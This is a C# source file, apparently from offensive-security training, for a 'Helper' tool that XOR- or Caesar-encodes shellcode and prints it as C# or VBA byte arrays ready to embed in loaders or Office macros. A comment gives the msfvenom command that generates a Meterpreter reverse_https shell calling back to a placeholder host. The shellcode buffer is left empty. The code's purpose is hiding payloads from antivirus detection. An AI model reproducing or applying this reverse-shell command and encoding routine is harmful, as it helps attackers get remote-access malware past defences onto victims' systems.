using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    class Program
    {
        /* Helper
         *
         * This code transforms the shellcode according to user input
         * XOR and Caesar are supported.
         *
         * To XOR:
         * Helper.exe <format> <transform> <transformArgument>
         * <format>: csharp or VBA
         * <transform>: caesar or xor
         * <transformArgument>: int if caesar, xor key if xor
         *
         * Example Usage:
         * Helper.exe csharp xor OSEP
         */
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 EXITFUNC=thread -e x86/xor_dyanmic -f csharp
            byte[] buf = new byte[596] {};


            String usage = "Useage\nHelper.exe <format> <transform> <transformArgument>\n  format: 'csharp' or 'VBA'\n  transform: 'caesar' or 'xor'\n  transformArgument: The shift as an int if caesar, the xor key as a string if xor";

            if (args.Length < 3)
            {
                Console.WriteLine(usage);
                return;
            }
            String format = args[0];
            String transform = args[1];
            String arg = args[2];


            // Check Arguments
            if ((format != "csharp" && format != "VBA") || (transform != "caesar" && transform != "xor"))
            {
                Console.WriteLine(usage);
                return;
            }

            byte[] output = new byte[0];

            if (transform == "caesar")
            {
                output = caesar(buf, Int32.Parse(arg));
            }
            else if (transform == "xor")
            {
                output = xor(buf, arg);
            }

            print_buf(output, format);
        }

        static byte[] caesar(byte[] buf, int shift)
        {

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + shift) & 0xFF);
            }

            return encoded;
        }

        static byte[] xor(byte[] buf, String key)
        {
            byte[] xorkey = Encoding.ASCII.GetBytes(key);

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ xorkey[i % xorkey.Length]);
            }

            return encoded;


        }

        static void print_buf(byte[] buf, String format)
        {
            uint counter = 0;
            StringBuilder sb = new StringBuilder(buf.Length * 2);
            foreach (byte b in buf)
            {
                if (format == "csharp")
                {
                    sb.AppendFormat("0x{0:x2}, ", b);
                } else if (format == "VBA")
                {
                    sb.AppendFormat("{0:D},", b);
                }
                counter++;
                if (counter % 50 == 0)
                {
                    if (format == "csharp")
                    {
                        sb.AppendFormat("{0}", Environment.NewLine);
                    }
                    else if (format == "VBA")
                    {
                        sb.AppendFormat(" _{0}", Environment.NewLine);
                    }
                }
            }
            String bufStart = "";
            String bufEnd = "";
            if (format == "csharp")
            {
                bufStart = "byte[] buf = new byte[" + buf.Length + "] {";
                bufEnd = "}";
            }
            else if (format == "VBA")
            {
                bufStart = "buf = Array(";
                bufEnd = ")";
            }

            Console.WriteLine("The transformed payload in " + format + " format is: \n" + bufStart + sb.ToString() + bufEnd + "\n\n");
        }
    }
}

